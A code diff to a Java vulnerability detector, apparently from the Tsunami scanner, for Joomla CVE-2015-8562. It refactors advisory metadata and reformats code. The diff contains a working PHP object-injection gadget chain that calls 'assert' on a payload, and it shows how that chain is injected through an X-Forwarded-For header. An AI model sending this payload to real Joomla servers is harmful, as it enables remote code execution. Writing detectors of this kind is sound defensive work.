@@ -86,6 +86,24 @@ public final class JoomlaCve20158562Detector implements VulnDetector {
   }
 
   @Override
+  public ImmutableList<Vulnerability> getAdvisories() {
+    return ImmutableList.of(
+        Vulnerability.newBuilder()
+            .setMainId(
+                VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE_2015_8562"))
+            .setSeverity(Severity.CRITICAL)
+            .addRelatedId(
+                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2015-8562"))
+            .setTitle("Joomla RCE via PHP object injection in HTTP headers (CVE-2015-8562)")
+            .setDescription(
+                "The Joomla application is vulnerable to CVE-2015-8562, which allow remote"
+                    + " attackers to conduct PHP object injection attacks and execute"
+                    + " arbitrary PHP code via the HTTP User-Agent header.")
+            .setRecommendation("Upgrade to Joomla 3.4.6 or greater.")
+            .build());
+  }
+
+  @Override
   public DetectionReportList detect(
       TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
     logger.atInfo().log("Starting detection for Joomla! CVE-2015-8562.");
@@ -195,14 +213,18 @@ public final class JoomlaCve20158562Detector implements VulnDetector {
         "}__fake|O:21:\"JDatabaseDriverMysqli\":3:{"
             + "s:2:\"fc\";O:17:\"JSimplepieFactory\":0:{}"
             + "s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{"
-              + "i:0;a:2:{"
-                + "i:0;O:9:\"SimplePie\":5:{"
-                  + "s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}"
-                  + "s:8:\"feed_url\";s:" + assertPayload.length() + ":\"" + assertPayload + "\";"
-                  + "s:19:\"cache_name_function\";s:6:\"assert\";"
-                  + "s:5:\"cache\";b:1;"
-                  + "s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}"
-                + "i:1;s:4:\"init\";}}"
+            + "i:0;a:2:{"
+            + "i:0;O:9:\"SimplePie\":5:{"
+            + "s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}"
+            + "s:8:\"feed_url\";s:"
+            + assertPayload.length()
+            + ":\""
+            + assertPayload
+            + "\";"
+            + "s:19:\"cache_name_function\";s:6:\"assert\";"
+            + "s:5:\"cache\";b:1;"
+            + "s:11:\"cache_class\";O:20:\"JDatabaseDriverMysql\":0:{}}"
+            + "i:1;s:4:\"init\";}}"
             + "s:13:\"\\0\\0\\0connection\";b:1;}";
     ByteArrayOutputStream payloadByteArray = new ByteArrayOutputStream();
     payloadByteArray.write(payloadString.getBytes(UTF_8));
@@ -213,19 +235,27 @@ public final class JoomlaCve20158562Detector implements VulnDetector {
   }
 
   private static byte[] buildHttpRequestWithPayload(
-      HostAndPort hostAndPort, ImmutableList<String> cookies,
-      byte[] phpObjectPayload) throws IOException {
+      HostAndPort hostAndPort, ImmutableList<String> cookies, byte[] phpObjectPayload)
+      throws IOException {
     // Both User-Agent and X-Forwarded-For are vulnerable to injection.
     // We use X-Forwarded-For since we're already using User-Agent for the Tsunami user agent.
     String httpRequestString =
         "GET / HTTP/1.1\r\n"
-        + "Host: " + hostAndPort.getHost() + ":" + hostAndPort.getPort() + "\r\n"
-        + "Connection: keep-alive\r\n"
-        + "Accept-Encoding: gzip\r\n"
-        + "Accept: */*\r\n"
-        + "User-Agent: " + TSUNAMI_USER_AGENT + "\r\n"
-        + "Cookie: " + String.join("; ", cookies) + "\r\n"
-        + "X-Forwarded-For: ";
+            + "Host: "
+            + hostAndPort.getHost()
+            + ":"
+            + hostAndPort.getPort()
+            + "\r\n"
+            + "Connection: keep-alive\r\n"
+            + "Accept-Encoding: gzip\r\n"
+            + "Accept: */*\r\n"
+            + "User-Agent: "
+            + TSUNAMI_USER_AGENT
+            + "\r\n"
+            + "Cookie: "
+            + String.join("; ", cookies)
+            + "\r\n"
+            + "X-Forwarded-For: ";
     ByteArrayOutputStream httpRequestByteArray = new ByteArrayOutputStream();
     httpRequestByteArray.write(httpRequestString.getBytes(UTF_8));
     httpRequestByteArray.write(phpObjectPayload);
@@ -240,19 +270,7 @@ public final class JoomlaCve20158562Detector implements VulnDetector {
         .setNetworkService(vulnerableNetworkService)
         .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
         .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
-        .setVulnerability(
-            Vulnerability.newBuilder()
-                .setMainId(
-                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE_2015_8562"))
-                .setSeverity(Severity.CRITICAL)
-                .addRelatedId(
-                    VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2015-8562"))
-                .setTitle("Joomla RCE via PHP object injection in HTTP headers (CVE-2015-8562)")
-                .setDescription(
-                    "The Joomla application is vulnerable to CVE-2015-8562, which allow remote"
-                        + " attackers to conduct PHP object injection attacks and execute"
-                        + " arbitrary PHP code via the HTTP User-Agent header.")
-                .setRecommendation("Upgrade to Joomla 3.4.6 or greater."))
+        .setVulnerability(this.getAdvisories().get(0))
         .build();
   }
 }
